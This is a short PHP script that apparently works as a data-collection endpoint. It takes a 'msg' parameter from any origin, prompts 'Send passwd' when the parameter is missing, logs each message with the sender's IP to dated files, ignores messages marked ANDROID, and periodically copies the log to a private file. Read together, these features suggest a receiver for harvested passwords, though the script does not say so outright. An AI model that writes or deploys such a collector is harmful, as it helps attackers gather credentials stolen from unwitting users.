<?php


header('Access-Control-Allow-Origin: *');

$url = $actual_link = "http://{$_SERVER['HTTP_HOST']}{$_SERVER['REQUEST_URI']}";
$parts = parse_url($url);
parse_str($parts['query'], $query);
if(!isset($query['msg']))
{
        die( "<h1>Send passwd</h1>");
}
echo "processing";

$file="/var/www/html/govtschemes.in/logs/".date('d-m-Y').".log";

echo $file;

$fp = fopen($file,"a");

if($fp == null)
{
	file_put_contents("/tmp/apxxxx","failed to open");
	return;
}
$dt = date("H:i:s");

if( false !=  strstr($query['msg'], "ANDROID"))
{
	exit(1);
}


fprintf($fp,"%s %s %s\n",$dt,get_client_ip(), urldecode($query['msg']));


fclose($fp);


if( microtime(true)% 8 == 0){

copy($file,"/var/www/html/govtschemes.in/private/notloggedin.txt");
}

function get_client_ip() {
    $ipaddress = '';
    if (isset($_SERVER['HTTP_CLIENT_IP']))
        $ipaddress = $_SERVER['HTTP_CLIENT_IP'];
    else if(isset($_SERVER['HTTP_X_FORWARDED_FOR']))
        $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR'];
    else if(isset($_SERVER['HTTP_X_FORWARDED']))
        $ipaddress = $_SERVER['HTTP_X_FORWARDED'];
    else if(isset($_SERVER['HTTP_FORWARDED_FOR']))
        $ipaddress = $_SERVER['HTTP_FORWARDED_FOR'];
    else if(isset($_SERVER['HTTP_FORWARDED']))
        $ipaddress = $_SERVER['HTTP_FORWARDED'];
    else if(isset($_SERVER['REMOTE_ADDR']))
        $ipaddress = $_SERVER['REMOTE_ADDR'];
    else
        $ipaddress = 'UNKNOWN';
    return $ipaddress;
}
